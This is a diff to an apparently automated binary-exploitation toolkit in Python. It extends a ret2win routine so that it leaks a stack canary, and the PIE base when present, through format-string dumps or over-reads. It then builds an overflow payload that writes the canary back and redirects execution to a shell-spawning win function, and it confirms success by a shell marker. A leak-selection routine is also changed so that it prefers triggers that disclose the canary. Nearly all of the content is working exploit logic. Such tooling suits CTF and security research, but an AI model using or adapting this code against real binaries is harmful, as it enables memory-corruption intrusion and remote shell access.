@@ -1227,16 +1227,23 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                        win_off, target_bytes, leak_recipe=None, canary_index=None,
                        canary_regex: str = r"0x[0-9a-fA-F]+", loop_feed: bytes | None = None, base_argv=(),
                        marker: bytes = b"LYKOS-PCW-9931", timeout: float = 8.0,
-                       mem_mb: int = 2048) -> dict:
-    """ret2win on a PIE + stack-canary target with an in-binary win (a function that spawns a shell
-    / prints the flag). Both the canary AND the PIE base are random per process, so BOTH are leaked
-    IN THE SAME PROCESS as the overflow: `canary_trigger` discloses them (a format `%p` dump or a
-    `printf("%s", buf)` over-read that runs into the canary and the saved return into image code);
-    `rop.find_canary` picks the canary and `exploit.recover_pie_base` pins the base from >=2
-    corroborating image pointers. The overflow then writes the leaked canary back
-    (`build_canary_prefix`) and returns to `win_off + pie_base`. Confirmed by a spawned shell
-    echoing `marker` (a win that execve's a shell) OR the win's own output containing the marker.
-    Returns {ok, canary, pie_base, win} or {ok: False, reason}."""
+                       mem_mb: int = 2048, pie: bool = True) -> dict:
+    """ret2win on a stack-canary target with an in-binary win (a function that spawns a shell /
+    prints the flag), WITHOUT any ROP gadget -- the overflow just writes the leaked canary back and
+    redirects the saved return to the win. This is the gadget-free L3 a modern small binary (no
+    `pop rdi; ret` since glibc dropped __libc_csu_init) can still reach past a canary.
+
+    The canary is random per process, so it is leaked IN THE SAME PROCESS as the overflow:
+    `canary_trigger` discloses it (a format `%p` dump, or a `printf("%s", buf)` over-read that runs
+    into the canary), and `rop.find_canary` picks it. `build_canary_prefix` writes it back so
+    __stack_chk_fail is never reached, then the return is set to the win.
+
+    `pie=True` (default): the image is also ASLR'd, so the PIE base is leaked from the SAME dump
+    (>=2 corroborating image pointers via `exploit.recover_pie_base`) and the win is `win_off +
+    pie_base`. `pie=False` (no-PIE): the image is at a fixed address, so NO base leak is needed --
+    `win_off` is the absolute win address and only the canary is leaked. Confirmed by a spawned
+    shell echoing `marker`, or the win's own output containing it. Returns {ok, canary, pie_base,
+    win} or {ok: False, reason}."""
     import struct as _struct
 
     from . import rop
@@ -1277,8 +1284,9 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                 if not leak_recipe:
                     _read_until(p, time.time() + 0.5)        # consume the opening banner (single-trigger)
                 canary, pie_base, pos = _leak(p, sel)
-                if canary is None or not pie_base:
-                    continue                                     # need BOTH in this process
+                if canary is None or (pie and not pie_base):
+                    continue                                     # need the canary (+ base when PIE)
+                base = pie_base if pie else 0                    # no-PIE: win_off is absolute
                 # offsets: analyst/caller value wins; else self-derive from the over-read -- the
                 # canary sits `pos` bytes into the overflow, the return another 16 past it (the
                 # standard [buf][canary][saved rbp][return] frame).
@@ -1295,8 +1303,8 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                 if align:                                        # a lone `ret` to fix 16-byte align
                     r = rop.find_gadget(target_bytes, "ret")
                     if r:
-                        payload += q(pie_base + r)
-                payload += q(pie_base + int(win_off))
+                        payload += q(base + r)
+                payload += q(base + int(win_off))
                 try:
                     p.stdin.write(bytes(payload))
                     p.stdin.flush()
@@ -1310,8 +1318,8 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                     continue
                 out = _read_until(p, time.time() + timeout, quiet=1.2)
                 if marker in out or b"/bin/sh" in out or b"$ " in out:
-                    return {"ok": True, "canary": canary, "pie_base": pie_base,
-                            "win": pie_base + int(win_off),
+                    return {"ok": True, "canary": canary, "pie_base": (pie_base if pie else None),
+                            "win": base + int(win_off),
                             "output": out[:400].decode("latin-1", "ignore")}
             finally:
                 for s in (p.stdin, p.stdout):
@@ -1325,8 +1333,19 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                     p.wait(timeout=2)
                 except Exception:                               # noqa: BLE001
                     pass
-    return {"ok": False, "reason": "PIE+canary ret2win: leaked the canary but could not corroborate "
-                                   "a PIE base from the same leak, or the redirect did not confirm"}
+    return {"ok": False, "reason": (
+        "PIE+canary ret2win: leaked the canary but could not corroborate a PIE base from the same "
+        "leak, or the redirect did not confirm") if pie else (
+        "no-PIE+canary ret2win: could not leak the canary from the trigger, or the redirect to win "
+        "did not confirm")}
+
+
+def canary_ret2win(exe, workdir, *, win_addr, **kw) -> dict:
+    """Gadget-free ret2win past a stack canary on a NO-PIE target: leak the canary, write it back,
+    redirect the saved return to the FIXED-address win. Thin wrapper over canary_pie_ret2win with
+    pie=False (win_off carries the absolute win address). Same keywords otherwise (canary_trigger,
+    canary_offset, ret_offset, target_bytes, canary_index, base_argv, timeout, ...)."""
+    return canary_pie_ret2win(exe, workdir, win_off=int(win_addr), pie=False, **kw)
 
 
 def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read_cap=255,
@@ -2056,11 +2075,21 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
         vals += _le_pointer_words(dump)
         vals += _le_canary_words(dump)                   # canary isn't pointer-shaped -> harvest it
         cls = classify_leak(vals, target_bytes, libc_data)
-        # keep the richest result (most fields recovered)
+        # keep the richest result (most fields recovered), but on a TIE prefer the one that
+        # recovered the CANARY. The canary is the gating secret for a canary-protected target and
+        # the hard thing to leak; a base-only leak of equal field-count cannot exploit a canary
+        # target at all (ret2libc past a canary needs the canary too, and a non-PIE ret2win needs
+        # only it). Without this tiebreak an L2 disclosure `extra_trigger` that leaks a base first
+        # (score 1) pinned `best`, and the later %p dump that leaks the canary (also score 1) could
+        # never replace it -- so `_canary_auto_ret2libc` saw canary=None and declined. (A canary and
+        # a base from DIFFERENT triggers are different processes and cannot be combined, so this is a
+        # genuine choice between recipes, not a merge.)
         score = sum(cls[k] is not None for k in ("pie_base", "libc_base", "canary"))
-        if score > sum(best[k] is not None for k in ("pie_base", "libc_base", "canary")):
+        best_score = sum(best[k] is not None for k in ("pie_base", "libc_base", "canary"))
+        if score > best_score or (score == best_score and score > 0
+                                  and cls["canary"] and not best["canary"]):
             best = {**cls, "trigger": trig, "dump": dump[:400]}
-        if cls["libc_base"] and cls["canary"]:              # enough to finish most chains
+        if cls["canary"] and (cls["libc_base"] or cls["pie_base"]):   # both in ONE process -> done
             best = {**cls, "trigger": trig, "dump": dump[:400]}
             break
     # Fallback for a leak behind a TYPED prompt sequence: the single-write triggers above fail when
